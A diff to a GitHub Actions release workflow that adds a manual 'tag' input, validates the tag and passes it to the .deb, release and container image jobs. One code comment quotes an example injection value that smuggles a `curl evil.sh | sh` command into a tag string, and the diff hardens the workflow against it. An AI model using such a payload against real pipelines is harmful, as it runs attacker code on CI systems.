@@ -9,23 +9,31 @@ on:
   push:
     tags:
       - "v*.*.*"
-  # Lets a maintainer (re-)run this workflow against a tag that already
-  # exists — e.g. a release that shipped before this workflow did.
-  # Trigger it from the Actions UI and pick the tag as the run's ref;
-  # github.ref_name will then be that tag name, same as on a tag push.
+  # Lets a maintainer (re-)run this workflow for a tag that already
+  # exists — e.g. a release that shipped before this workflow did, or a
+  # run that needs to be repeated after a registry outage. Unlike the
+  # push trigger, this always runs from the default branch (the tag
+  # itself is not checked out automatically for a manual run), so the
+  # tag to build and release is passed explicitly via the `tag` input
+  # instead of being read off github.ref_name.
   workflow_dispatch:
     inputs:
+      tag:
+        description: "Existing vX.Y.Z tag to build and attach artifacts for"
+        type: string
+        required: true
       publish_latest:
         description: "Also move the :latest image tag and the Latest release badge to this tag"
         type: boolean
         default: false
 
 jobs:
-  # The push trigger's tag glob ("v*.*.*") is looser than it looks — it
-  # also matches things like "v1.2.3-rc1" — and workflow_dispatch can be
-  # run against any ref at all (a branch, "dev", anything). Fail fast and
-  # clearly instead of letting either case reach make build-deb or the
-  # image push with a non-release ref.
+  # Resolves and validates which tag this run releases, then hands that
+  # tag to every other job as an output (needs.guard.outputs.release_tag)
+  # rather than letting each job read github.ref_name itself — on a
+  # workflow_dispatch run github.ref_name is the default branch, not a
+  # release tag, so every downstream use of "the tag" has to go through
+  # this output instead.
   #
   # This job also decides whether this run is allowed to move the
   # floating ":latest" image tag / the Release "Latest" badge: a normal
@@ -39,22 +47,66 @@ jobs:
     runs-on: ubuntu-latest
     permissions: {}
     outputs:
+      release_tag: ${{ steps.resolve.outputs.release_tag }}
       promote_latest: ${{ steps.decide.outputs.promote_latest }}
     steps:
-      - name: Require a vX.Y.Z tag
+      - name: Resolve and validate the release tag
+        id: resolve
+        # inputs.tag and github.ref_name are attacker-influenceable
+        # strings (a workflow_dispatch caller controls the former; a tag
+        # pusher controls the latter) — the ${{ }} expression syntax does
+        # plain text substitution into the script *before* the shell
+        # ever runs, so interpolating either one directly into `run:`
+        # would let a value like `v1.0.0"; curl evil.sh | sh #` execute
+        # as shell code ahead of the regex check below. Pass them through
+        # `env:` instead so they only ever reach the shell as ordinary
+        # variable values.
+        env:
+          TAG_INPUT: ${{ inputs.tag }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          ref="${{ github.ref_name }}"
-          if [[ ! "$ref" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-            echo "::error::Release workflow requires a semver tag (vX.Y.Z), got ref '$ref' (event: ${{ github.event_name }})."
-            echo "If this was a manual run, re-dispatch and select an existing vX.Y.Z tag as the ref."
+          if [[ "${{ github.event_name }}" == "workflow_dispatch" ]]; then
+            tag="$TAG_INPUT"
+          else
+            tag="$REF_NAME"
+          fi
+
+          if [[ ! "$tag" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "::error::Release workflow requires a semver tag (vX.Y.Z), got '$tag' (event: ${{ github.event_name }})."
+            echo "For a manual run, set the 'tag' input to an existing vX.Y.Z tag."
             exit 1
           fi
-          echo "Releasing $ref"
+
+          # A tag push guarantees the ref exists (it IS the tag being
+          # pushed). workflow_dispatch's `tag` is just a free-form string
+          # input though, and this run executes from the default branch —
+          # confirm the tag actually exists before any other job tries to
+          # build or release it, so a typo fails loudly here instead of
+          # softprops/action-gh-release silently attaching assets to a
+          # release created against the wrong ref.
+          if [[ "${{ github.event_name }}" == "workflow_dispatch" ]]; then
+            if ! git ls-remote --exit-code --tags \
+                "${{ github.server_url }}/${{ github.repository }}.git" \
+                "refs/tags/$tag" >/dev/null; then
+              echo "::error::Tag '$tag' does not exist in ${{ github.repository }}."
+              exit 1
+            fi
+          fi
+
+          echo "release_tag=$tag" >> "$GITHUB_OUTPUT"
+          echo "Releasing $tag"
 
       - name: Decide whether to promote :latest
         id: decide
+        # Same reasoning as the step above: publish_latest is declared as
+        # a boolean input, but a workflow triggered via the REST API
+        # (rather than the Actions UI) is not restricted to "true"/
+        # "false" for it — treat it as an untrusted string and pass it
+        # through env: rather than interpolating it into the script.
+        env:
+          PUBLISH_LATEST_INPUT: ${{ inputs.publish_latest }}
         run: |
-          if [[ "${{ github.event_name }}" == "push" || "${{ inputs.publish_latest }}" == "true" ]]; then
+          if [[ "${{ github.event_name }}" == "push" || "$PUBLISH_LATEST_INPUT" == "true" ]]; then
             echo "promote_latest=true" >> "$GITHUB_OUTPUT"
           else
             echo "promote_latest=false" >> "$GITHUB_OUTPUT"
@@ -70,6 +122,7 @@ jobs:
       - name: Checkout
         uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
         with:
+          ref: ${{ needs.guard.outputs.release_tag }}
           fetch-depth: 0
 
       - name: Setup Go
@@ -79,7 +132,7 @@ jobs:
           cache: true
 
       - name: Build .deb packages (amd64 + arm64)
-        run: make build-deb VERSION=${{ github.ref_name }}
+        run: make build-deb VERSION=${{ needs.guard.outputs.release_tag }}
 
       - name: Generate checksums
         run: |
@@ -96,7 +149,7 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         with:
-          tag_name: ${{ github.ref_name }}
+          tag_name: ${{ needs.guard.outputs.release_tag }}
           fail_on_unmatched_files: true
           make_latest: ${{ needs.guard.outputs.promote_latest }}
           files: |
@@ -113,10 +166,19 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
+        with:
+          ref: ${{ needs.guard.outputs.release_tag }}
 
-      - name: Compute build date
+      # github.sha is the commit that triggered the run, which on
+      # workflow_dispatch is the default branch tip, not the tag's
+      # commit (the checkout step above already moved HEAD to the tag
+      # via `ref:`) — read the actual checked-out commit instead so the
+      # image's embedded commit metadata is correct on both trigger types.
+      - name: Compute image build metadata
         id: meta
-        run: echo "date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"
+        run: |
+          echo "date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"
+          echo "commit=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"
 
       # Only include the floating ":latest" tag when this run is allowed
       # to promote it (see the guard job) — otherwise a retroactive
@@ -124,7 +186,7 @@ jobs:
       - name: Compute image tags
         id: tags
         run: |
-          tags="ghcr.io/302-digital/attachra:${{ github.ref_name }}"
+          tags="ghcr.io/302-digital/attachra:${{ needs.guard.outputs.release_tag }}"
           if [[ "${{ needs.guard.outputs.promote_latest }}" == "true" ]]; then
             tags="${tags}"$'\n'"ghcr.io/302-digital/attachra:latest"
           fi
@@ -154,8 +216,8 @@ jobs:
           platforms: linux/amd64,linux/arm64
           push: true
           build-args: |
-            VERSION=${{ github.ref_name }}
-            COMMIT=${{ github.sha }}
+            VERSION=${{ needs.guard.outputs.release_tag }}
+            COMMIT=${{ steps.meta.outputs.commit }}
             DATE=${{ steps.meta.outputs.date }}
           tags: ${{ steps.tags.outputs.tags }}
           cache-from: type=gha
